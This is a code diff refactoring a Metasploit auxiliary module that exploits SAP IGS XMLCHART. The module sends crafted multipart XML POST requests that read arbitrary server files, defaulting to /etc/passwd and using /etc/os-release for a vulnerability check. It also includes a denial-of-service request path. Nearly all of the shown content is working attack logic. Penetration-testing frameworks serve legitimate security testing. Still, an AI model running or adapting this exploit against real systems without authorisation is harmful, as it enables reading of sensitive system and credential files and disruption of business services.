@@ -40,8 +40,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(40080),
         OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
-        OptString.new('URN', [ false, 'SAP IGS XMLCHART URN', '/XMLCHART']),
-        OptBool.new('SHOW', [false, 'Show remote file content', true])
+        OptString.new('URN', [ false, 'SAP IGS XMLCHART URN/URL', '/XMLCHART']),
       ]
     )
   end
@@ -131,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_download_link(html_response)
     if html_response['ImageMap']
-      if (download_link_regex = /ImageMap" href="(?<link>.*)">ImageMap/.match(html_response))
+      if (download_link_regex = html_response.match(/ImageMap" href="(?<link>.*)">ImageMap/))
         @download_link = download_link_regex[:link]
       else
         @download_link = nil
@@ -165,7 +164,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless second_response.code == 200
       get_file_content(second_response.body)
     else
-      print_status("System is vulnerable, but not found file: #{@file} on host: #{@host}")
+      print_status("System is vulnerable, but the file #{@file} was not found on the host #{@host}")
     end
   end
 
@@ -173,14 +172,15 @@ class MetasploitModule < Msf::Auxiliary
 
     # Set up XML data for HTTP request
     get_variables
-    make_post_data('/etc/os-release', false) # Get linux OS release and added this in MSF Workspase
+    make_post_data('/etc/os-release', false) # Create a XML data payload to retrieve the value of /etc/os-release
+                                             # so that the module can check if the target is vulnerable or not.
 
     # Send HTTP request
     begin
       check_response = nil
       check_response = send_request_cgi(
         {
-          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
+          'uri' => normalize_uri(@urn),
           'method' => 'POST',
           'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
           'data' => @post_data.to_s
@@ -192,16 +192,15 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Check HTTP response
-    return Exploit::CheckCode::Safe if check_response.nil?
-    return Exploit::CheckCode::Safe unless check_response.code == 200
-    return Exploit::CheckCode::Safe unless check_response.body.include?('Picture') && check_response.body.include?('Info')
-    return Exploit::CheckCode::Safe unless check_response.body.match?(/ImageMap|Errors/)
+    if check_response.nil? || check_response.code != 200 || !(check_response.body.include?('Picture') && check_response.body.include?('Info')) || !(check_response.body.match?(/ImageMap|Errors/))
+      return Exploit::CheckCode::Safe
+    end
 
     # Get OS release information
     os_release = ''
     analyze_first_response(check_response.body)
     if @file_content
-      if (os_regex = /^PRETTY_NAME.*=.*"(?<os>.*)"$/.match(@file_content))
+      if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
         os_release = "OS info: #{os_regex[:os]}"
       end
     end
@@ -249,14 +248,14 @@ class MetasploitModule < Msf::Auxiliary
 
     # Set up XML data for HTTP request
     get_variables
-    make_post_data(@file, false) # @file - is Option FILE (File to read from the remote server, by default: /etc/passwd)
+    make_post_data(@file, false)
 
     # Send HTTP request
     begin
       first_response = nil
       first_response = send_request_cgi(
         {
-          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN, by default: /XMLCHART)
+          'uri' => normalize_uri(@urn),
           'method' => 'POST',
           'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
           'data' => @post_data.to_s
@@ -268,10 +267,9 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Check first HTTP response
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if first_response.nil?
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.code == 200
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.include?('Picture') && first_response.body.include?('Info')
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless first_response.body.match?(/ImageMap|Errors/)
+    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !(first_response.body.match?(/ImageMap|Errors/))
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
+    end
 
     # Report Vulnerability
     report_vuln(
@@ -304,7 +302,7 @@ class MetasploitModule < Msf::Auxiliary
       dos_response = nil
       dos_response = send_request_cgi(
         {
-          'uri' => normalize_uri(@urn), # @urn - is Option URN (SAP IGS XMLCHART URN default: /XMLCHART)
+          'uri' => normalize_uri(@urn),
           'method' => 'POST',
           'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
           'data' => @post_data.to_s
